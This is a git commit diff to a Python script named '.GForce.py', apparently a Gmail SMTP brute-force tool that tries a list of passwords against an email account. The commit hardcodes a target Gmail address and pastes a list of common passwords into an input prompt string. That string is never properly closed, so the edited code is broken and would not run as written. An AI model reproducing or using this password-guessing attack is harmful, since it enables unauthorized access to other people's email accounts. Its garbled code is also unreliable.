ccb17a5b56d67ccb0da615df66acf72f4a74bcfe
mustaphano <65376419+mustaphano@users.noreply.github.com>
2020-05-15 00:44:01 +0000

    Update .GForce.py

--- .GForce.py
+++ .GForce.py
@@ -4,8 +4,56 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Please enter the email adress: ")
-passwfile = raw_input("Enter the password list: ")
+user = raw_input("gamba@gmail.com: ")
+passwfile = raw_input("123456
+password
+12345678
+qwerty
+123456789
+12345
+1234
+111111
+1234567
+dragon
+123123
+baseball
+abc123
+football
+monkey
+letmein
+696969
+shadow
+master
+666666
+qwertyuiop
+123321
+mustang
+1234567890
+michael
+654321
+pussy
+superman
+1qaz2wsx
+7777777
+fuckyou
+121212
+000000
+qazwsx
+123qwe
+killer
+trustno1
+jordan
+jennifer
+zxcvbnm
+asdfgh
+hunter
+buster
+soccer
+harley
+batman
+andrew
+tigger
+sunshine: ")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
